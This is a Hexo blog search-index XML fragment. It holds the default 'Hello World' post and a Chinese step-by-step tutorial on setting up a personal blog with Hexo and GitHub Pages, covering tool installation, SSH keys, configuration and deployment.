    <url>/2022/01/16/html/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/01/16/hello-world/"/>
    <url>/2022/01/16/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>hexo+github搭建个人博客</title>
    <link href="/2021/07/10/hexo+github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    <url>/2021/07/10/hexo+github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="hexo-github搭建个人博客的过程及注意事项"><a href="#hexo-github搭建个人博客的过程及注意事项" class="headerlink" title="hexo+github搭建个人博客的过程及注意事项"></a>hexo+github搭建个人博客的过程及注意事项</h1><p>前几天刚利用hexo+github搭建好了个人博客，那么这第一篇文章就来写写搭建过程，说不定以后用得到，也希望能给想搭建的朋友提供一些帮助，能少踩一点坑</p><span id="more"></span><h2 id="第一步：工具安装"><a href="#第一步：工具安装" class="headerlink" title="第一步：工具安装"></a>第一步：工具安装</h2><p>首先是工具的安装，我们先安装GitBash，进入git官网：<a href="https://git-scm.com/">https://git-scm.com/</a>，直接点击download选择相应版本下载即可；</p><p>然后安装node.js，直接进入node官网：<a href="https://nodejs.org/en/download/">https://nodejs.org/en/download/</a>下载即可，安装时一定要勾选全部组件，以及<code>add to path</code>，让它给你自动配置环境变量，这样安装node.js时就已经完成了npm的安装以及环境变量的配置。完成后在cmd和Git Bash下都输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node -v # 会显示node版本号，说明安装成功</span><br><span class="line">npm -v # 会显示npm版本号，说明安装成功</span><br></pre></td></tr></table></figure><p>如果它显示<code>command not found</code>，可能就是环境变量配置有问题，记得用户变量也需要配置，把npm的用户变量配上就行</p><p><img src="https://i.loli.net/2021/07/10/XsaKNBVELxtguDZ.png" alt="image.png"></p><h2 id="第二步：GitHub注册"><a href="#第二步：GitHub注册" class="headerlink" title="第二步：GitHub注册"></a>第二步：GitHub注册</h2><p>然后进入到github官网：<a href="https://github.com/">https://github.com/</a>，注册一个自己的账号，邮箱和用户名要选择常用的哈，方便记住，然后在Git Bash上设置一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;user_name&quot; # user_name填入GitHub用户名</span><br><span class="line">git config --global user.email &quot;user_email&quot; # user_email填入GitHub注册的邮箱</span><br></pre></td></tr></table></figure><p>然后我们查看已设置的用户名和邮箱，能看到就说明设置成功：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config user.name</span><br><span class="line">git config user.email</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/10/QRzEtF7N5smLBWv.png" alt="image.png"></p><h2 id="第三步：GitHub创建仓库及配置SSH-key"><a href="#第三步：GitHub创建仓库及配置SSH-key" class="headerlink" title="第三步：GitHub创建仓库及配置SSH key"></a>第三步：GitHub创建仓库及配置SSH key</h2><p>登录github后选择右上角+号，选择new repository，用户名必须为:<strong>你的用户名.github.io</strong>，这里必须注意，否则后面会出问题，那么将来你的网站首页地址就是：https://你的用户名.github.io了，就像下图这样(我的肯定是已注册）</p><p><img src="https://i.loli.net/2021/07/10/H4X37Lcn1hb2ElO.png" alt="image.png"></p><p>打开Git Bash，在里面输入命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;user.email&quot; # user.email为GitHub上注册的邮箱</span><br></pre></td></tr></table></figure><p>然后直接三个回车即可，默认不需要设置密码，当然你要设也可以，只是要记住，以后部署博客的时候需要用的，我觉得没太大必要，然后去用户主目录看有没有ssh密钥，就在这里面，如下图，将里面id_rsa.pub文件内容全部复制下来，注意看不要多了空格，换行符等等，id_rsa.pub是公钥，可以告诉他人，而id_rsa是私钥就不能泄露了，然后打开github设置密钥界面：<a href="https://github.com/settings/keys">https://github.com/settings/keys</a>，点击<code>New SSH key</code>,tiitle为标题可以随便取，然后内容为刚刚复制的id_rsa.pub公钥复制进去即可，最后点击<code>Add SSH key</code></p><p><img src="https://i.loli.net/2021/07/10/fIt52ZSewEAaJuV.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/29/FWX5u2LzfBlbnY9.png" alt="image.png"></p><p>然后我们在Git Bash中验证是否连接成功，输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>这里面需要注意的是，第一次输入的时候它会问你yes/no，你得输入yes后再回车，不能直接回车，然后显示出下图这个页面说明连接成功：</p><p><img src="https://i.loli.net/2021/07/10/dymWaeJu1Cl7SvP.png" alt="image.png"></p><h2 id="第四步：安装hexo"><a href="#第四步：安装hexo" class="headerlink" title="第四步：安装hexo"></a>第四步：安装hexo</h2><p><code>Hexo</code> 是一个简单、快速、强大的基于 <code>Github Pages</code> 的博客框架，支持 <code>Markdown</code> 格式，有众多优秀插件和主题。</p><p>然后我们就安装hexo，在Git Bash中操作哈，别用cmd，网上很多说直接用<code>$ npm install -g hexo-cli</code>直接安装的，我试了试一直不行，也不知道为什么，所以说我就先安装cnpm，这里我用的是淘宝的镜像源，如果错误就重来，因为连接可能不稳定，失败了多试几次就可以了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br><span class="line">cnpm -v   #如果显示cnpm的版本信息就说明安装成功</span><br><span class="line">cnpm install -g hexo-cli   #安装 hexo（如果失败重新来过)</span><br><span class="line">hexo -v   #返回 hexo 的版本信息</span><br></pre></td></tr></table></figure><p>如果这里显示出了hexo的版本信息，就说明安装成功了，然后我们在电脑中随便找一个地方，建立一个空文件夹，以后你博客的所有东西就都在这里面操作，进入这个空文件夹，右键，点击Git Bash Here，打开Git Bash终端，然后输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init     #初始化 hexo</span><br><span class="line">ls -l     #查看初始化获得的文件</span><br><span class="line">hexo s    #启动 hexo，本地预览</span><br></pre></td></tr></table></figure><p>然后这里如果都没问题的话，就可以在本地4000端口查看自己的网站了，就是这个网站：<a href="http://localhost:4000/">http://localhost:4000</a></p><h2 id="第五步：将博客部署到GitHub上"><a href="#第五步：将博客部署到GitHub上" class="headerlink" title="第五步：将博客部署到GitHub上"></a>第五步：将博客部署到GitHub上</h2><p>然后我们就需要将我们本地的博客搭到GitHub上去了，首先需要修改配置文件，打开博客文件夹中的配置文件<code>_config.yml</code>，需要进行修改：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">这里贴一份网上看到的  可以复制替换原来的  但是替换之前最好备份 可能会出错</span><br><span class="line">那要么你就对照着看一下改就好:</span><br><span class="line"># Hexo Configuration</span><br><span class="line">## Docs: http://zespia.tw/hexo/docs/configure.html</span><br><span class="line">## Source: https://github.com/tommy351/hexo/</span><br><span class="line"></span><br><span class="line"># Site </span><br><span class="line">title: My Blog #博客名</span><br><span class="line">subtitle: to be continued... #副标题</span><br><span class="line">description: My blog #给搜索引擎看的，对网站的描述，可以自定义</span><br><span class="line">author: Yourname #作者，在博客底部可以看到</span><br><span class="line">email: yourname@yourmail.com #你的联系邮箱</span><br><span class="line">language: zh-CN #中文。如果不填则默认英文</span><br><span class="line"></span><br><span class="line"># URL #这项暂不配置，绑定域名后，欲创建sitemap.xml需要配置该项</span><br><span class="line">## If your site is put in a subdirectory, set url as &#x27;http://yoursite.com/child&#x27; and root as &#x27;/child/&#x27;</span><br><span class="line">url: http://yoursite.com</span><br><span class="line">root: /</span><br><span class="line">permalink: :year/:month/:day/:title/</span><br><span class="line">tag_dir: tags</span><br><span class="line">archive_dir: archives</span><br><span class="line">category_dir: categories</span><br><span class="line"></span><br><span class="line"># Writing 文章布局、写作格式的定义，不修改</span><br><span class="line">new_post_name: :title.md # File name of new posts</span><br><span class="line">default_layout: post</span><br><span class="line">auto_spacing: false # Add spaces between asian characters and western characters</span><br><span class="line">titlecase: false # Transform title into titlecase</span><br><span class="line">max_open_file: 100</span><br><span class="line">filename_case: 0</span><br><span class="line">highlight:</span><br><span class="line">  enable: true</span><br><span class="line">  backtick_code_block: true</span><br><span class="line">  line_number: true</span><br><span class="line">  tab_replace:</span><br><span class="line"></span><br><span class="line"># Category &amp; Tag</span><br><span class="line">default_category: uncategorized</span><br><span class="line">category_map:</span><br><span class="line">tag_map:</span><br><span class="line"></span><br><span class="line"># Archives 默认值为2，这里都修改为1，相应页面就只会列出标题，而非全文</span><br><span class="line">## 2: Enable pagination</span><br><span class="line">## 1: Disable pagination</span><br><span class="line">## 0: Fully Disable</span><br><span class="line">archive: 1</span><br><span class="line">category: 1</span><br><span class="line">tag: 1</span><br><span class="line"></span><br><span class="line"># Server 不修改</span><br><span class="line">## Hexo uses Connect as a server</span><br><span class="line">## You can customize the logger format as defined in</span><br><span class="line">## http://www.senchalabs.org/connect/logger.html</span><br><span class="line">port: 4000</span><br><span class="line">logger: false</span><br><span class="line">logger_format:</span><br><span class="line"></span><br><span class="line"># Date / Time format 日期格式，可以修改成自己喜欢的格式</span><br><span class="line">## Hexo uses Moment.js to parse and display date</span><br><span class="line">## You can customize the date format as defined in</span><br><span class="line">## http://momentjs.com/docs/#/displaying/format/</span><br><span class="line">date_format: YYYY-M-D</span><br><span class="line">time_format: H:mm:ss</span><br><span class="line"></span><br><span class="line"># Pagination 每页显示文章数，可以自定义，贴主设置的是10</span><br><span class="line">## Set per_page to 0 to disable pagination</span><br><span class="line">per_page: 10</span><br><span class="line">pagination_dir: page</span><br><span class="line"></span><br><span class="line"># Disqus Disqus插件，我们会替换成“多说”，不修改</span><br><span class="line">disqus_shortname:</span><br><span class="line"></span><br><span class="line"># Extensions 这里配置站点所用主题和插件，暂时默认</span><br><span class="line">## Plugins: https://github.com/tommy351/hexo/wiki/Plugins</span><br><span class="line">## Themes: https://github.com/tommy351/hexo/wiki/Themes</span><br><span class="line">theme: landscape</span><br><span class="line">exclude_generator:</span><br><span class="line">plugins:</span><br><span class="line">- hexo-generator-feed</span><br><span class="line">- hexo-generator-sitemap</span><br><span class="line"></span><br><span class="line"># Deployment 站点部署到github要配置(重点！！！)</span><br><span class="line">## Docs: http://zespia.tw/hexo/docs/deploy.html</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: //这里是需要填的，下面会讲</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p>然后我们打开Github个人主页的Repository，进入到自己的博客项目，复制项目的SSH码，这里一定要看清楚是复制SSH码哈，<a href="mailto:&#x67;&#105;&#116;&#x40;&#103;&#105;&#116;&#x68;&#117;&#x62;&#x2e;&#x63;&#111;&#x6d;">&#x67;&#105;&#116;&#x40;&#103;&#105;&#116;&#x68;&#117;&#x62;&#x2e;&#x63;&#111;&#x6d;</a>开头的，然后粘贴到配置文件最后的repository中，粘贴好后CTRL+S保存即可：</p><p><img src="https://i.loli.net/2021/07/10/QPj8UKGsRDaLBI1.png" alt="image.png"></p><p>然后依次执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo clean // 清除存缓（不用每次执行）</span><br><span class="line">hexo g     // 修改生成</span><br><span class="line">hexo s     // 修改预览（不用每次执行） </span><br><span class="line">hexo d     // 修改部署</span><br></pre></td></tr></table></figure><p>最后一步<code>hexo d</code>是最重要的，但这里可能会出现<code>ERROR Deployer not found: git</code>报错，这是因为我们没有安装<code>hexo-deployer-git</code>这个插件，但因为安装这个插件需要新建文件夹，而在有的目录下新建文件夹需要管理员权限，这里就需要就在开始菜单输入cmd，并且以管理员身份运行就可，如下图：</p><p><img src="https://i.loli.net/2021/07/10/WvS8ol1GTty5hDL.png" alt="image.png"></p><p>然后执行<code>cnpm install hexo-deployer-git --save</code>安装这个插件，这里还有一个坑，就是必须要在站点目录下执行这句安装<code>hexo-deployer-git</code>的命令，所谓站点目录就是执行<code>hexo init</code>的目录，也就是建立博客的主文件夹，要在里面执行命令才行，如果已经在其他目录安装了<code>hexo-deployer-git</code>插件的小伙伴，可以使用以下命令卸载该插件：<code>cnpm uninstall hexo-deployer-git --save</code>，由于我们是打开的是cmd，所以说要先用<code>cd</code>命令转到站点目录下，然后执行命令安装<code>hexo-deployer-git</code>插件就行啦，然后<code>hexo d</code>就不会报错啦，等一两分钟去看自己博客主页就有东西啦！我们的博客就搭好啦！快往里面放东西吧！</p>]]></content>
    
    
    
    <tags>
      
      <tag>环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
